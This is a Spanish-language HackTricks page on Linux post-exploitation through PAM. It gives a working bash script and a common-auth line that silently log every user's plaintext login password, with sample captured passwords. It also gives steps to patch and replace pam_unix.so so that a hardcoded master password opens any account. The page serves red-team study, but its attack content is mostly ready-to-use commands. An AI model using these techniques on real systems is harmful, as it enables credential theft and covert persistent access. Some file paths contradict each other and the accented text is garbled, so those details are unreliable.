# Post-Explotaci칩n en Linux

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Sniffing de Contrase침as de Inicio de Sesi칩n con PAM

Vamos a configurar un m칩dulo PAM para registrar cada contrase침a que cada usuario utiliza para iniciar sesi칩n. Si no sabes qu칠 es PAM, consulta:

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

Primero, creamos un script de bash que ser치 invocado cada vez que ocurra una nueva autenticaci칩n.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
```
Las variables son espec칤ficas de PAM y estar치n disponibles a trav칠s del m칩dulo `pam_exec.so`.

Aqu칤 est치 el significado de las variables:

* **$PAM\_USER:** El nombre de usuario que se ingres칩.
* **$PAM\_RHOST:** El host remoto (t칤picamente la direcci칩n IP)
* **$(cat -):** Esto lee `stdin`, y contendr치 la contrase침a que el script captura
* Los resultados se redirigen a un archivo de registro en `/var/log/toomanysecrets.log`

Para **evitar que todos los usuarios lean** el archivo, considere crearlo previamente y ejecutar `chmod`, por ejemplo:
```bash
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
```
A continuaci칩n, es necesario actualizar el archivo de configuraci칩n de PAM; se utilizar치 el m칩dulo `pam_exec` para invocar el script.

Hay varios archivos de configuraci칩n ubicados en `/etc/pam.d/`, y elegimos `common-auth`.
```
sudo nano /etc/pam.d/common-auth
```
Al final del archivo, a침ade el siguiente m칩dulo de autenticaci칩n:

`auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh`

Las opciones tienen el siguiente significado:

* **optional:** La autenticaci칩n no deber칤a fallar si hay un error (no es un paso obligatorio)
* **pam\_exec.so:** Este es el m칩dulo PAM de vivir de la tierra que puede invocar scripts arbitrarios
* **expose\_authtok:** Este es el truco que permite leer la contrase침a a trav칠s de `stdin`
* **quiet:** No mostrar ning칰n error al usuario (si algo no funciona)
* El 칰ltimo argumento es el script de shell que se cre칩 anteriormente

![](<../../.gitbook/assets/image (375).png>)

Finalmente, haz el archivo ejecutable:

`sudo chmod 700 /usr/local/bin/toomanysecrets.sh`

Ahora, probemos esto y hagamos ssh desde otra m치quina, o iniciemos sesi칩n localmente.

Y luego miremos el archivo de registro:
```
$ sudo cat /var/log/toomanysecrets.log
Sun Jun 26 23:36:37 PDT 2022 tom, Trustno1!, From: 192.168.1.149
Sun Jun 26 23:37:53 PDT 2022 tom, Trustno1!, From:
Sun Jun 26 23:39:12 PDT 2022 tom, Trustno1!, From: 192.168.1.149
```
### Puertas traseras en PAM

Vamos a las fuentes de PAM (depende de tu distribuci칩n, toma el mismo n칰mero de versi칩n que la tuya...) y observa alrededor de las l칤neas 170/180 en el archivo pam_unix_auth.c:
```
vi modules/pam_unix/pam_unix_auth.c
```
![](<../../.gitbook/assets/image (651).png>)

Cambiemos esto por:

![](<../../.gitbook/assets/image (638) (2) (2).png>)

Esto permitir치 que cualquier usuario que use la **contrase침a "0xMitsurugi"** pueda iniciar sesi칩n.

Recompila el `pam_unix_auth.c`, y reemplaza el archivo pam\_unix.so:
```bash
make
sudo cp \
/home/mitsurugi/PAM/pam_deb/pam-1.1.8/modules/pam_unix/.libs/pam_unix.so \
/lib/x86_64-linux-gnu/security/
```
{% hint style="info" %}
Puedes automatizar este proceso con [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
{% endhint %}

## Referencias

* [https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)
* [https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
